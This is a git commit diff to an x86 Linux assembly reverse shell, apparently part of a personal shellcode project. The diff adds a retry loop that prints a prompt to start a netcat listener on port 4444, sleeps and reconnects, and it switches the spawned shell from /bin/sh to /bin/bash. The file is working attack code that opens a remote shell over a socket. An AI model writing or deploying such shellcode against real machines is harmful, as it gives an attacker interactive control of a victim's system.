115afdf04e53f3e41cf8a9e4af96e8ade3d79420
DaC00n <dtroyc@protonmail.com>
2022-01-23 13:37:57 +0100

    Adding sleep and message if netcat not launch

--- reverseShell.asm
+++ reverseShell.asm
@@ -2,13 +2,25 @@
 
 global _start
 
+
 section .text
+
+
+section .data
+ncmsg db "You need to launch nc -nlvp 4444", 0xA
+len equ $ - ncmsg
+
+timeval:
+tv_sec dd 0 ; seconds
+tv_nsec dd 0 ; nanoseconds
+
 
 _start:
 ; clean registers
 xor eax, eax
 xor ebx, ebx
 xor ecx, ecx
+xor edx, edx
 
 mov al, 0x66 ; socketcall syscall
 mov bl, 0x1  ; socket syscall
@@ -21,7 +33,6 @@ mov  ecx, esp
 
 int 0x80 ; launch the syscall
 
-xor edx, edx
 xor ecx, ecx
 
 mov edx, eax ; mov socketfd from socket syscall return value in edx
@@ -43,6 +54,27 @@ mov ecx, esp ; ecx point to the top of the stack
 
 int 0x80
 
+; if the return code of eax is not null, nc is not lauch, so we need to wait and go back to the begining of the code
+
+cmp eax, 0
+je dupfd
+
+mov edx, len
+mov ecx, ncmsg
+mov ebx, 1
+mov eax, 4
+int 0x80
+
+mov dword [tv_sec], 0xA
+mov dword [tv_nsec], 0
+mov eax, 0xA2
+mov ebx, timeval
+mov ecx, 0
+int 0x80
+
+jmp _start
+
+dupfd:
 mov al, 0x3F ; mov dup2 syscall to al for STDIN
 mov ebx, edx ; mov socketfd in ebx
 
@@ -64,8 +96,9 @@ int 0x80
 mov al, 0xB ; execve syscall
 
 push ebx        ; NULL
-push 0x68732f6e ; hs/n
-push 0x69622f2f ; ib//
+push 0x68736162 ; hsab
+push 0x2F2F2F2F ; ////
+push 0x6E69622F ; nib/
 
 mov ebx, esp
 
